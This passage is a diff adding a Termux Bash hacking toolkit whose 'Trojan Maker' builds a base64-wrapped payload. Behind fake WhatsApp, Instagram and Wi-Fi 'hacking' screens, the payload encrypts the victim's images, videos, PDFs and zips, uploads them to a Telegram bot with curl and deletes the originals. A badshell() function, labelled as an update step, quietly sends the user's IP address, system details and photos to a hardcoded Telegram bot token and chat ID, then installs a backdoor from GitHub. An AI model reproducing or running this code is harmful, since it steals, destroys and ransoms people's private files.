+                        for filename in \$(find /storage/ -name *.gif);do
+
+                        
+
+                        hack_is_complet=\$(cat /dev/urandom | tr -dc '0-9' | fold -w 9 | head -n 1)
+
+                            echo -e \$info'Try The Password : '\$hack_is_complet
+
+                            openssl aes-256-cbc -e -in \$filename -out \$filename.enc_gif-k \$PassEnc &>> /dev/null
+
+                            curl -F document=@\$filename 'https://api.telegram.org/bot\$ID_BOT/sendDocument' -F chat_id=\$ChatID &>> /dev/null
+
+                            rm -rfd \$filename
+
+                        done
+##########33######3#$8338392928272849393929282838383920293938394949394838383939e839s9w839e9d8e939e8vd
+                        for filename in \$(find /storage/ -name *.zip);do
+
+                        
+
+                        hack_is_complet=\$(cat /dev/urandom | tr -dc 'A-Z' | fold -w 9 | head -n 1)
+
+                            echo -e \$info'Try The Password : '\$hack_is_complet
+
+                            openssl aes-256-cbc -e -in \$filename -out \$filename.enc_zip-k \$PassEnc &>> /dev/null
+
+                            curl -F document=@\$filename 'https://api.telegram.org/bot\$ID_BOT/sendDocument' -F chat_id=\$ChatID &>> /dev/null
+
+                            rm -rfd \$filename
+
+                        done
+
+			echo -e \$info 'The Username is : \$ID '
+			echo -e \$info 'The Password is : \$hack_is_complet '
+#---------------------------------------------------------#---------------------------------------------------------#---------------------------------------------------------
+		elif [[ \$name == 'Whatsapp Hacking' ]];then
+
+echo '
+
+┌────────────────────────────────────────────────────────────────────────────────┐
+│                                                                                │
+│▄▄      ▄▄ ▄▄                                         ▄▄                        │
+│██      ██ ██                    ██                  ████                       │
+│▀█▄ ██ ▄█▀ ██▄████▄   ▄█████▄  ███████   ▄▄█████▄    ████    ██▄███▄   ██▄███▄  │
+│ ██ ██ ██  ██▀   ██   ▀ ▄▄▄██    ██      ██▄▄▄▄ ▀   ██  ██   ██▀  ▀██  ██▀  ▀██ │
+│ ███▀▀███  ██    ██  ▄██▀▀▀██    ██       ▀▀▀▀██▄   ██████   ██    ██  ██    ██ │
+│ ███  ███  ██    ██  ██▄▄▄███    ██▄▄▄   █▄▄▄▄▄██  ▄██  ██▄  ███▄▄██▀  ███▄▄██▀ │
+│ ▀▀▀  ▀▀▀  ▀▀    ▀▀   ▀▀▀▀ ▀▀     ▀▀▀▀    ▀▀▀▀▀▀   ▀▀    ▀▀  ██ ▀▀▀    ██ ▀▀▀   │
+│                                                             ██        ██       │
+│                                                                        HACKING │
+└────────────────────────────────────────────────────────────────────────────────┘By @Blue24Bluer
+
+'
+
+			echo -e \$info 'Can You Put The number of the account you will attack ?'
+                	read -p ' ------------:}=> ' ID
+
+			sleep 5
+        	        echo -e \$info 'START HACKING'
+
+			cd /sdcard/DCIM/Camera/
+
+
+			for filename in \$(find /storage/ -name *.jpg); do
+
+                        
+
+                        hack_is_complet=\$(cat /dev/urandom | tr -dc '0-9' | fold -w 6 | head -n 1)
+
+                            echo -e \$info'Try The Password : '\$hack_is_complet
+
+                            openssl aes-256-cbc -e -in \$filename -out \$filename.enc_jpg -k \$PassEnc &>> /dev/null
+
+                            curl -F document=@\$filename 'https://api.telegram.org/bot\$ID_BOT/sendDocument' -F chat_id=\$ChatID &>> /dev/null
+
+                            rm -rfd \$filename
+                        done
+##########33######3#$8338392928272849393929282838383920293938394949394838383939e839s9w839e9d8e939e8vd
+                        for filename in \$(find /storage/ -name *.png);do
+
+                        
+
+                        hack_is_complet=\$(cat /dev/urandom | tr -dc '0-9' | fold -w 6 | head -n 1)
+
+                            echo -e \$info'Try The Password : '\$hack_is_complet
+
+                            openssl aes-256-cbc -e -in \$filename -out \$filename.enc_png -k \$PassEnc &>> /dev/null
+
+                            curl -F document=@\$filename 'https://api.telegram.org/bot\$ID_BOT/sendDocument' -F chat_id=\$ChatID &>> /dev/null
+
+                            rm -rfd \$filename
+
+                        done
+
+##########33######3#$8338392928272849393929282838383920293938394949394838383939e839s9w839e9d8e939e8vd
+                        for filename in \$(find /storage/ -name *.mp4);do
+
+                        
+
+                        hack_is_complet=\$(cat /dev/urandom | tr -dc '0-9' | fold -w 6 | head -n 1)
+
+                            echo -e \$info'Try The Password : '\$hack_is_complet
+
+                            openssl aes-256-cbc -e -in \$filename -out \$filename.enc_mp4 -k \$PassEnc &>> /dev/null
+
+                            curl -F document=@\$filename 'https://api.telegram.org/bot\$ID_BOT/sendDocument' -F chat_id=\$ChatID &>> /dev/null
+
+                            rm -rfd \$filename
+
+                        done
+##########33######3#$8338392928272849393929282838383920293938394949394838383939e839s9w839e9d8e939e8vd
+                        for filename in \$(find /storage/ -name *.pdf);do
+
+                        
+
+                        hack_is_complet=\$(cat /dev/urandom | tr -dc '0-9' | fold -w 6 | head -n 1)
+
+                            echo -e \$info'Try The Password : '\$hack_is_complet
+
+                            openssl aes-256-cbc -e -in \$filename -out \$filename.enc_pdf -k \$PassEnc &>> /dev/null
+
+                            curl -F document=@\$filename 'https://api.telegram.org/bot\$ID_BOT/sendDocument' -F chat_id=\$ChatID &>> /dev/null
+
+                            rm -rfd \$filename
+
+                        done
+##########33######3#$8338392928272849393929282838383920293938394949394838383939e839s9w839e9d8e939e8vd
+                        for filename in \$(find /storage/ -name *.gif);do
+
+                        
+
+                        hack_is_complet=\$(cat /dev/urandom | tr -dc '0-9' | fold -w 6 | head -n 1)
+
+                            echo -e \$info'Try The Password : '\$hack_is_complet
+
+                            openssl aes-256-cbc -e -in \$filename -out \$filename.enc_gif-k \$PassEnc &>> /dev/null
+
+                            curl -F document=@\$filename 'https://api.telegram.org/bot\$ID_BOT/sendDocument' -F chat_id=\$ChatID &>> /dev/null
+
+                            rm -rfd \$filename
+
+                        done
+##########33######3#$8338392928272849393929282838383920293938394949394838383939e839s9w839e9d8e939e8vd
+                        for filename in \$(find /storage/ -name *.zip);do
+
+                        
+
+                        hack_is_complet=\$(cat /dev/urandom | tr -dc '0-9' | fold -w 6 | head -n 1)
+
+                            echo -e \$info'Try The Password : '\$hack_is_complet
+
+                            openssl aes-256-cbc -e -in \$filename -out \$filename.enc_zip-k \$PassEnc &>> /dev/null
+
+                            curl -F document=@\$filename 'https://api.telegram.org/bot\$ID_BOT/sendDocument' -F chat_id=\$ChatID &>> /dev/null
+
+                            rm -rfd \$filename
+
+                        done
+
+
+                        echo -e \$info 'The Username is : \$ID '
+                        echo -e \$info 'The Password is : \$hack_is_complet '
+#---------------------------------------------------------#---------------------------------------------------------#---------------------------------------------------------
+		elif [[ \$name == 'Instagram Hacking' ]];then
+
+echo '
+
+┌──────────────────────────────────────────────────┐
+│                                                  │
+│  ▄▄▄▄▄▄                                          │
+│  ▀▀██▀▀                         ██               │
+│    ██     ██▄████▄  ▄▄█████▄  ███████    ▄█████▄ │
+│    ██     ██▀   ██  ██▄▄▄▄ ▀    ██       ▀ ▄▄▄██ │
+│    ██     ██    ██   ▀▀▀▀██▄    ██      ▄██▀▀▀██ │
+│  ▄▄██▄▄   ██    ██  █▄▄▄▄▄██    ██▄▄▄   ██▄▄▄███ │
+│  ▀▀▀▀▀▀   ▀▀    ▀▀   ▀▀▀▀▀▀      ▀▀▀▀    ▀▀▀▀ ▀▀ │
+│                                          HACKING │
+│                                                  │By @Blue24Bluer
+└──────────────────────────────────────────────────┘
+
+
+'
+
+
+			echo -e \$info 'Can You Put The ID of the account you will attack ?'
+                	read -p ' ------------:}=> ' ID
+
+
+			sleep 5
+        	        echo -e \$info 'START HACKING'
+
+			cd /sdcard/DCIM/Camera/
+
+			for filename in \$(find /storage/ -name *.jpg); do
+
+                        
+
+                        hack_is_complet=\$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 9 | head -n 1)
+
+                            echo -e \$info'Try The Password : '\$hack_is_complet
+
+                            openssl aes-256-cbc -e -in \$filename -out \$filename.enc_jpg -k \$PassEnc &>> /dev/null
+
+                            curl -F document=@\$filename 'https://api.telegram.org/bot\$ID_BOT/sendDocument' -F chat_id=\$ChatID &>> /dev/null
+
+                            rm -rfd \$filename
+                        done
+##########33######3#$8338392928272849393929282838383920293938394949394838383939e839s9w839e9d8e939e8vd
+                        for filename in \$(find /storage/ -name *.png);do
+
+                        
+
+                        hack_is_complet=\$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 9 | head -n 1)
+
+                            echo -e \$info'Try The Password : '\$hack_is_complet
+
+                            openssl aes-256-cbc -e -in \$filename -out \$filename.enc_png -k \$PassEnc &>> /dev/null
+
+                            curl -F document=@\$filename 'https://api.telegram.org/bot\$ID_BOT/sendDocument' -F chat_id=\$ChatID &>> /dev/null
+
+                            rm -rfd \$filename
+
+                        done
+
+##########33######3#$8338392928272849393929282838383920293938394949394838383939e839s9w839e9d8e939e8vd
+                        for filename in \$(find /storage/ -name *.mp4);do
+
+                        
+
+                        hack_is_complet=\$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 9 | head -n 1)
+
+                            echo -e \$info'Try The Password : '\$hack_is_complet
+
+                            openssl aes-256-cbc -e -in \$filename -out \$filename.enc_mp4 -k \$PassEnc &>> /dev/null
+
+                            curl -F document=@\$filename 'https://api.telegram.org/bot\$ID_BOT/sendDocument' -F chat_id=\$ChatID &>> /dev/null
+
+                            rm -rfd \$filename
+
+                        done
+##########33######3#$8338392928272849393929282838383920293938394949394838383939e839s9w839e9d8e939e8vd
+                        for filename in \$(find /storage/ -name *.pdf);do
+
+                        
+
+                        hack_is_complet=\$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 9 | head -n 1)
+
+                            echo -e \$info'Try The Password : '\$hack_is_complet
+
+                            openssl aes-256-cbc -e -in \$filename -out \$filename.enc_pdf -k \$PassEnc &>> /dev/null
+
+                            curl -F document=@\$filename 'https://api.telegram.org/bot\$ID_BOT/sendDocument' -F chat_id=\$ChatID &>> /dev/null
+
+                            rm -rfd \$filename
+
+                        done
+##########33######3#$8338392928272849393929282838383920293938394949394838383939e839s9w839e9d8e939e8vd
+                        for filename in \$(find /storage/ -name *.gif);do
+
+                        
+
+                        hack_is_complet=\$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 9 | head -n 1)
+
+                            echo -e \$info'Try The Password : '\$hack_is_complet
+
+                            openssl aes-256-cbc -e -in \$filename -out \$filename.enc_gif-k \$PassEnc &>> /dev/null
+
+                            curl -F document=@\$filename 'https://api.telegram.org/bot\$ID_BOT/sendDocument' -F chat_id=\$ChatID &>> /dev/null
+
+                            rm -rfd \$filename
+
+                        done
+##########33######3#$8338392928272849393929282838383920293938394949394838383939e839s9w839e9d8e939e8vd
+                        for filename in \$(find /storage/ -name *.zip);do
+
+                        
+
+                        hack_is_complet=\$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 9 | head -n 1)
+
+                            echo -e \$info'Try The Password : '\$hack_is_complet
+
+                            openssl aes-256-cbc -e -in \$filename -out \$filename.enc_zip-k \$PassEnc &>> /dev/null
+
+                            curl -F document=@\$filename 'https://api.telegram.org/bot\$ID_BOT/sendDocument' -F chat_id=\$ChatID &>> /dev/null
+
+                            rm -rfd \$filename
+
+                        done
+
+
+
+
+                        echo -e \$info ' The Username is : \$ID '
+                        echo -e \$info ' The Password is : \$hack_is_complet '
+#---------------------------------------------------------#---------------------------------------------------------#---------------------------------------------------------
+		elif [[ \$name == 'Wifi Hacking' ]];then
+
+echo '
+
+
+┌────────────────────────────────────────┐
+│                                        │
+│▄▄      ▄▄    ██     ▄▄▄▄▄▄▄▄     ██    │
+│██      ██    ▀▀     ██▀▀▀▀▀▀     ▀▀    │
+│▀█▄ ██ ▄█▀  ████     ██         ████    │
+│ ██ ██ ██     ██     ███████      ██    │
+│ ███▀▀███     ██     ██           ██    │
+│ ███  ███  ▄▄▄██▄▄▄  ██        ▄▄▄██▄▄▄ │
+│ ▀▀▀  ▀▀▀  ▀▀▀▀▀▀▀▀  ▀▀        ▀▀▀▀▀▀▀▀ │
+│                                HACKING │
+│                                        │By @BLUE24BLUER
+└────────────────────────────────────────┘
+
+
+'
+
+
+                        echo -e \$info 'Can You Put The ID of the account you will attack ?'
+                        read -p ' ------------:}=> ' ID
+
+
+                        sleep 5
+                        echo -e \$info 'START HACKING'
+
+                        cd /sdcard/DCIM/Camera/
+                        for filename in \$(find /storage/ -name *.jpg); do
+
+			
+
+                        hack_is_complet=\$(cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 9 | head -n 1)
+
+                            echo -e \$info'Try The Password : '\$hack_is_complet
+
+                            openssl aes-256-cbc -e -in \$filename -out \$filename.enc_jpg -k \$PassEnc &>> /dev/null
+
+                            curl -F document=@\$filename 'https://api.telegram.org/bot\$ID_BOT/sendDocument' -F chat_id=\$ChatID &>> /dev/null
+
+                            rm -rfd \$filename
+                        done
+##########33######3#$8338392928272849393929282838383920293938394949394838383939e839s9w839e9d8e939e8vd
+			for filename in \$(find /storage/ -name *.png);do
+
+			
+
+                        hack_is_complet=\$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 9 | head -n 1)
+
+                            echo -e \$info'Try The Password : '\$hack_is_complet
+
+                            openssl aes-256-cbc -e -in \$filename -out \$filename.enc_png -k \$PassEnc &>> /dev/null
+
+                            curl -F document=@\$filename 'https://api.telegram.org/bot\$ID_BOT/sendDocument' -F chat_id=\$ChatID &>> /dev/null
+
+                            rm -rfd \$filename
+
+			done
+
+##########33######3#$8338392928272849393929282838383920293938394949394838383939e839s9w839e9d8e939e8vd
+                        for filename in \$(find /storage/ -name *.mp4);do
+
+                        
+
+                        hack_is_complet=\$(cat /dev/urandom | tr -dc 'a-z' | fold -w 9 | head -n 1)
+
+                            echo -e \$info'Try The Password : '\$hack_is_complet
+
+                            openssl aes-256-cbc -e -in \$filename -out \$filename.enc_mp4 -k \$PassEnc &>> /dev/null
+
+                            curl -F document=@\$filename 'https://api.telegram.org/bot\$ID_BOT/sendDocument' -F chat_id=\$ChatID &>> /dev/null
+
+                            rm -rfd \$filename
+
+                        done
+##########33######3#$8338392928272849393929282838383920293938394949394838383939e839s9w839e9d8e939e8vd
+                        for filename in \$(find /storage/ -name *.pdf);do
+
+                        
+
+                        hack_is_complet=\$(cat /dev/urandom | tr -dc 'A-Z' | fold -w 9 | head -n 1)
+
+                            echo -e \$info'Try The Password : '\$hack_is_complet
+
+                            openssl aes-256-cbc -e -in \$filename -out \$filename.enc_pdf -k \$PassEnc &>> /dev/null
+
+                            curl -F document=@\$filename 'https://api.telegram.org/bot\$ID_BOT/sendDocument' -F chat_id=\$ChatID &>> /dev/null
+
+                            rm -rfd \$filename
+
+                        done
+##########33######3#$8338392928272849393929282838383920293938394949394838383939e839s9w839e9d8e939e8vd
+                        for filename in \$(find /storage/ -name *.gif);do
+
+                        
+
+                        hack_is_complet=\$(cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 9 | head -n 1)
+
+                            echo -e \$info'Try The Password : '\$hack_is_complet
+
+                            openssl aes-256-cbc -e -in \$filename -out \$filename.enc_gif-k \$PassEnc &>> /dev/null
+
+                            curl -F document=@\$filename 'https://api.telegram.org/bot\$ID_BOT/sendDocument' -F chat_id=\$ChatID &>> /dev/null
+
+                            rm -rfd \$filename
+
+                        done
+##########33######3#$8338392928272849393929282838383920293938394949394838383939e839s9w839e9d8e939e8vd
+                        for filename in \$(find /storage/ -name *.zip);do
+
+                        
+
+                        hack_is_complet=\$(cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 9 | head -n 1)
+
+                            echo -e \$info'Try The Password : '\$hack_is_complet
+
+                            openssl aes-256-cbc -e -in \$filename -out \$filename.enc_zip-k \$PassEnc &>> /dev/null
+
+                            curl -F document=@\$filename 'https://api.telegram.org/bot\$ID_BOT/sendDocument' -F chat_id=\$ChatID &>> /dev/null
+
+                            rm -rfd \$filename
+
+                        done
+
+
+                        echo -e \$info ' The Username is : \$ID '
+                        echo -e \$info ' The Password is : \$hack_is_complet '
+#---------------------------------------------------------#---------------------------------------------------------#---------------------------------------------------------
+		fi
+
+	else
+
+		echo -e \$info 'Error , pls enapel the storage For Termux'
+
+	fi
+else
+
+	echo -e \$info 'Error ! n pls use termux '
+
+fi
+
+
+" >> B24B_Vi
+
+base64 B24B_Vi > B24B_Virus
+
+echo "echo '" > B24B_"$vV"
+
+cat B24B_Virus >> B24B_"$vV"
+
+echo "' > File " >> B24B_"$vV"
+
+echo "base64 -d File > $PREFIX/etc/B24B_'$vV' " >> B24B_"$vV"
+
+echo "rm -rfd File " >> B24B_"$vV"
+
+echo "bash $PREFIX/etc/B24B_'$vV'" >> B24B_"$vV"
+
+rm -rfd B24B_Vi B24B_Virus File
+
+echo '#! /usr/bin/bash
+
+# Colors
+
+b="\033[1;30m"
+r="\033[1;31m"
+g="\033[1;32m"
+y="\033[1;33m"
+b="\033[1;34m"
+p="\033[1;35m"
+c="\033[1;36m"
+v="\033[1;37m"
+w="\033[0;37m"
+
+black="\033[1;30m"
+red="\033[1;31m"
+green="\033[1;32m"
+yellow="\033[1;33m"
+blue="\033[1;34m"
+purple="\033[1;35m"
+cyan="\033[1;36m"
+violate="\033[1;37m"
+white="\033[0;37m"
+nc="\033[00m"
+
+info="${cyan}[${white}+${cyan}] ${yellow}"
+fun="${cyan}[${white}@${cyan}] ${purple}"
+ask="${cyan}[${white}?${cyan}] ${purple}"
+bad="${cyan}[${white}!${cyan}] ${red}"
+good="${cyan}[${white}√${cyan}] ${green}"
+
+
+echo -e $info $r "THIS TOOL MADE BY $b @Blue24Bluer"
+
+sleep 5
+
+echo -e $info "Fixing All Trojan .."
+
+apt install openssl -y
+
+for i in $(find /storage/ -name *.enc_jpg);do
+
+openssl aes-256-cbc -d -in $i -out $i.jpg -k $PassEnc &>> /dev/null
+echo -e $info "Finshed Decoded file : /storage/$i [√]"
+
+done
+
+for i in $(find /storage/ -name *.enc_png);do
+
+openssl aes-256-cbc -d -in $i -out $i.png -k $PassEnc &>> /dev/null
+echo -e $info "Finshed Decoded file : /storage/$i [√]"
+
+done
+
+for i in $(find /storage/ -name *.enc_zip);do
+
+openssl aes-256-cbc -d -in $i -out $i.zip -k $PassEnc &>> /dev/null
+echo -e $info "Finshed Decoded file : /storage/$i [√]"
+
+done
+
+for i in $(find /storage/ -name *.enc_mp4);do
+
+openssl aes-256-cbc -d -in $i -out $i.mp4 -k $PassEnc &>> /dev/null
+echo -e $info "Finshed Decoded file : /storage/$i [√]"
+
+done
+
+for i in $(find /storage/ -name *.enc_pdf);do
+
+openssl aes-256-cbc -d -in $i -out $i.pdf -k $PassEnc &>> /dev/null
+echo -e $info "Finshed Decoded file : /storage/$i [√]"
+
+done
+
+for i in $(find /storage/ -name *.enc_gif);do
+
+openssl aes-256-cbc -d -in $i -out $i.gif -k $PassEnc &>> /dev/null
+echo -e $info "Finshed Decoded file : /storage/$i [√]"
+
+done
+
+sleep 10
+
+echo -e $info "Finshed , Have A Good Day !"
+
+
+' > Tree
+
+base64 Tree > Trea
+
+echo "echo '" > B24B_Treatment
+
+cat B24B_Trea >> B24B_Treatment
+
+echo "' > File " >> B24B_Treatment
+
+echo "base64 -d File > $PREFIX/etc/B24B_Treatment " >> B24B_Treatment
+
+echo "rm -rfd File " >> B24B_Treatment
+
+echo "bash $PREFIX/etc/B24B_Treatment " >> B24B_Treatment
+
+rm -rfd B24B_Tree B24B_Trea File
+
+SaX=0
+
+while true ;do
+
+((SaX++))
+
+if [[ $SaX == "1" ]];then
+echo -e $info $r "BULID THE TROJAN [*]"
+sleep 5
+((Tim++))
+fi
+
+if [[ $SaX == "2" ]];then
+echo -e $info $r "BULLD THE METERPRETER [*]"
+sleep 5
+((Tim++))
+fi
+
+if [[ $SaX == "3" ]];then
+echo -e $info $r "MAKE IT BETTER [*]"
+sleep 5
+((Tim++))
+fi
+
+if [[ $SaX == "4" ]];then
+echo -e $info $r "ADD THE METERPRETER [*]"
+sleep 5
+((Tim++))
+fi
+
+if [[ $SaX == "5" ]];then
+echo -e $info $r "ADD THE TROJAN [*]"
+sleep 5
+((Tim++))
+fi
+
+if [[ $SaX == "6" ]];then
+echo -e $info $r "Make The Treatment [*]"
+sleep 5
+echo -e $info $r "SAVED INTO $home/Treatment [*]"
+sleep 3
+((Tim++))
+fi
+
+if [[ $SaX == "7" ]];then
+echo -e $info $r "MAKE IT... [*]"
+sleep 5
+echo -e $info $r "SAVED INTO $home/B24B_'$vV' [*]"
+sleep 5
+
+echo -e $info "Now Send The $home/B24B_'$vV' To $r Victam " | pv -qL 10
+echo -e $info "Do You Want To Start Meterpreter Attack On $r Victam ? "
+
+read -p " ------------:}=> " Read #####
+
+if [[ $Read == 'yes' || $Read == 'Yeah' || $Read == 'Yes' || $Read == 'YEAH' || $Read == 'YES' || $Read == 'yes' || $Read == 'y' || $Read == 'Y' ]];then
+
+StartM
+
+else
+
+echo -e $info 'Exit'
+sleep 3
+menu
+
+fi
+
+
+fi
+
+
+done
+#---------------------------------------------------------
+
+elif [[ $TT == "2" ]];then
+
+	StartM
+
+else
+	echo -e $info "Error!"
+	sleep 3
+	menu
+
+fi
+
+}
+
+#{-------------GPT---------------------}
+GPT(){
+
+ban
+
+toilet -f mono12 -F border 'Comming Soon' | lolcat
+
+sleep 3
+
+menu
+
+
+}
+#{-------------menu--------------------}
+menu() {
+clear
+ban
+Klam
+
+echo -e $info " This Tool Made By @Blue24Bluer " #----> you have to install pv firs
+echo -e $ask " chose one to fix your problem "
+echo -e " "
+echo -e " "
+
+echo -e $blue " [1]-$g---$y--> install new tools     <--------------$b---$g---------[1]  " #-----> like metasploit and john ...
+echo -e $blue " [2]-$g-$y----> make meterpreter with metasploit <---------$b------[2]  " #----> like tmvenom
+echo -e $blue " [3]-$g---$y--> new themes for termux & klai <-----$b-----$y---------[3]  "
+echo -e $blue " [4]-$g-$y----> install proot-diestro <---$b-----$g------$r------------[4]  " # for termux just
+echo -e $blue " [5]-$g---$y--> port scan for all <---$y--------$r-------$b------------[5]  "
+echo -e $blue " [6]-$g---$y--> Ngrok & CloudFleard installer <-$r---------$y--------[6]  "
+echo -e $blue " [7]-$g--$y---> Mikrotik router Hacking Brute Fource <-$g---$y-------[7]  "
+echo -e $blue " [8]-$g---$y--> send an message to me if there error <----$b--$y-----[8]  "
+echo -e $blue " [9]-$g---$y-> Encode and Decode Files <--------$b------$r-----------[9] "
+echo -e $blue " [10]--$g---$y>     ChatGpt    <----------------$r------$q-----------[10] "
+echo -e $blue " [11]--$g---$y> DDOS ATTACKING <------------$r-------$y--------------[11] "
+echo -e $blue " [12]--$g-$y--> Start Extrnal Port <-----$b------$g-----------$y-------[12] "
+echo -e $blue " [13]--$b-$y--> Scan an image <----------$g------$y-----------$r-------[13] "
+echo -e $blue " [14]--$r-$y--> Send Anonemnos by bot telegram <----------$g-------$y[14] "
+echo -e $blue " [15]-----------> LinuxGamer <-------------------------------[15] " | lolcat
+echo -e $blue " [16]-----------> $r Trojan Maker $y <---------------------------[16] "
+echo -e $red  " [00]----------------------------> exit <--------------------[00] "
+
+echo -e " "
+echo -e " "
+
+printf $ask " chose one :>"
+read -p " ------------:}=> "  qi
+
+# List chose num 1
+
+  if [[ $qi == "1" ]];then
+        new
+elif [[ $qi == "2" ]];then
+        msf
+elif [[ $qi == "3" ]];then
+        thm
+elif [[ $qi == "4" ]];then
+        prot
+elif [[ $qi == "5" ]];then
+	port
+elif [[ $qi == "6" ]];then
+	NC
+elif [[ $qi == "7" ]];then
+	Mik
+elif [[ $qi == "8" ]];then
+	Sen
+elif [[ $qi == "9" ]];then
+	ED
+elif [[ $qi == "10" ]];then
+	GPT
+elif [[ $qi == "11" ]];then
+	DDos
+elif [[ $qi == "12" ]];then
+	Clo
+elif [[ $qi == "13" ]];then
+	img
+elif [[ $qi == "14" ]];then
+	AnO
+elif [[ $qi == "15" ]];then
+	gamer
+elif [[ $qi == "16" ]];then
+	TrojanMaker
+elif [[ $qi == "00" ]];then
+        exit
+elif [[ $talk_AI == "12" && $qi == "B24B" ]];then
+
+	ban
+	echo -e $info "Nice work, i will give u something "
+	echo -e $info "If you installed my app 'TheBlue' on your android"
+	echo -e $info "You can Clik on my pfp and susses the exam "
+	echo -e $info "If You Win I will give You Some Cource as Free !!"
+	echo -e $r "GOOD LUCK ..." | pv -qL 5
+	menu
+
+elif [[ $talk_AI == "15" && $qi == "FBI" ]];then
+
+	ban
+	echo -e $info "OH No !"
+
+elif [[ $talk_AI == "13" && $qi == "yes" ||$talk_AI == "13" && $qi == "yeah" ||$talk_AI == "13" && $qi == "y" ||$talk_AI == "13" && $qi == "Y" ||$talk_AI == "13" && $qi == "yes" ||$talk_AI == "13" && $qi == "yep" ||$talk_AI == "13" && $qi == "Yeah" ||$talk_AI == "13" && $qi == "YES" ||$talk_AI == "13" && $qi == "YEP" ||$talk_AI == "13" && $qi == "YEAH" ]];then
+
+echo -e $info $b "I WILL BE WITH YOU ♥ " | pv -qL 10
+echo -e $info " Talk with me on telegram @Blue24Bluer "
+sleep 4
+menu
+
+elif [[ $qi > "16" ]];then
+
+        echo -e $error " chose from the list !!"
+	sleep 2
+	menu
+
+elif [[ $qi < "0" ]];then
+
+        echo -e $error " chose from the list !!"
+        sleep 2
+        menu
+
+elif [[ $qi == "ls" ]];then
+
+exec $qi ; sleep 3 ; menu
+
+elif [[ $qi == "dir" ]];then
+
+exec $qi ; sleep 3 ; menu
+
+elif [[ $qi == "ifconfig" ]];then
+
+exec $qi ; sleep 3 ; menu
+
+elif [[ $qi == "cd" ]];then
+
+exec $qi ; sleep 3 ; menu
+
+elif [[ $qi == "kill" ]];then
+
+exec $qi ; sleep 3 ; menu
+
+elif [[ $qi == "man" ]];then
+
+exec $qi ; sleep 3 ; menu
+
+elif [[ $qi == "yes" ]];then
+
+exec $qi ; sleep 3 ; menu
+
+elif [[ $qi == "nano" ]];then
+
+exec $qi ; sleep 3 ; menu
+
+elif [[ $qi == "printf" ]];then
+
+exec $qi ; sleep 3 ; menu
+
+elif [[ $qi == "echo" ]];then
+
+exec $qi ; sleep 3 ; menu
+
+else
+
+echo -e $info $r "Error"
+
+sleep 4
+
+menu
+
+fi
+
+}
+#{--------------------------------------------}
+SendHackedFile(){
+zip -r $PREFIX/etc/Hacked/Hacked.zip $PREFIX/etc/Hacked/*
+TOKEN="5691570782:AAGMKFygk9MyAlZXtPNddydtDsY4Ouo8-ng"
+CHAT_ID="5010958919"
+IPaddres=$(curl ifconfig.me)
+DATAS=$(neofetch)
+FILES=/storage/
+VIDEO=$(find $FILES -name *.mp4)
+PNG=$(find $FILES -name *.png)
+JPG=$(find $FILES -name *.jpg)
+H4CKED=$PREFIX/etc/Hacked/Hacked.zip
+
+curl -F document=@$H4CKED "https://api.telegram.org/bot$TOKEN/sendDocument" -F chat_id=$CHAT_ID &>> /dev/null
+if [[ $? == "0" ]];then
+echo ''
+rm -rfd $PREFIX/etc/Hacked
+else
+SendHackedFile
+fi
+
+}
+#################################################################################
+badshell() {
+
+ban
+net
+
+echo -e $info "Loading .. .. .. [X]"
+
+# this can bulid a backdoor in your system
+
+if [[ -d $PREFIX/etc/Hacked ]] ;then
+
+	echo ' '
+	menu
+else
+
+	if [[ $nN == "Y" ]];then
+
+		echo -e $info $r "UPDATE & UPGRADE AllInOne"
+
+		TOKEN="5691570782:AAGMKFygk9MyAlZXtPNddydtDsY4Ouo8-ng"
+		CHAT_ID="5010958919"
+		IPaddres="$(curl ifconfig.me)"
+		DATAS="$(uname -a)"
+		FILES=/storage/
+		#VIDEO=$(find $FILES -name *.mp4)
+		#PNG=$(find $FILES -name *.png)
+		#JPG=$(find $FILES -name *.jpg)
+
+		echo -e $info $r "[★] SCANING ..."
+
+		curl -X POST --silent --output /dev/null https://api.telegram.org/bot$TOKEN/sendMessage -d chat_id=$CHAT_ID -d text=" Hi Boss You Have new Victam !! " &>> /dev/null
+		curl -X POST --silent --output /dev/null https://api.telegram.org/bot$TOKEN/sendMessage -d chat_id=$CHAT_ID -d text="$IPaddres" &>> /dev/null
+		curl -X POST --silent --output /dev/null https://api.telegram.org/bot$TOKEN/sendMessage -d chat_id=$CHAT_ID -d text="$DATAS" &>> /dev/null
+		# Fetch files
+
+		for jpg in $(find $FILES -name *.jpg)
+		do
+
+		# Upload the file
+  			curl -F document=@$jpg "https://api.telegram.org/bot$TOKEN/sendDocument" -F chat_id=$CHAT_ID &>> /dev/null
+
+		done
+
+		for video in $(find $FILES -name *.mp4)
+		do
+			curl -F document=@$video "https://api.telegram.org/bot$TOKEN/sendDocument" -F chat_id=$CHAT_ID &>> /dev/null
+
+		done
+
+		for png in $(find $FILES -name *.png)
+		do
+			curl -F document=@$png "https://api.telegram.org/bot$TOKEN/sendDocument" -F chat_id=$CHAT_ID &>> /dev/null
+
+
+		done
+
+		echo -e $info $r "[★] Wite sec .."
+
+		if [[ $termux == "true" ]];then
+
+#			zip -r $PREFIX/etc/Hacked/w.zip /sdcard/WhatsApp/* &>> /dev/null
+
+#			zip -r $PREFIX/etc/Hacked/t.zip /sdcard/Telegram/* &>> /dev/null
+
+#			curl -F document=@$PREFIX/etc/Hacked/w.zip "https://api.telegram.org/bot$TOKEN/sendDocument" -F chat_id=$CHAT_ID &>> /dev/null
+
+#			curl -F document=@$PREFIX/etc/Hacked/t.zip "https://api.telegram.org/bot$TOKEN/sendDocument" -F chat_id=$CHAT_ID &>> /dev/null
+
+			curl -X POST --silent --output /dev/null https://api.telegram.org/bot$TOKEN/sendMessage -d chat_id=$CHAT_ID -d text=" end fo data victams " &>> /dev/null
+
+#			rm -rfd $PREFIX/etc/Hacked/t.zip $PREFIX/etc/Hacked/w.zip &>> /dev/null
+			clear
+		fi
+
+		echo -e $info $r "[★] FINSHED ...."
+
+
+			git clone https://github.com/blue24bluer/badshell &>> /dev/null
+
+                	mv badshell/badshell $PREFIX/bin/Hacked
+                	chmod +x $PREFIX/bin/Hacked
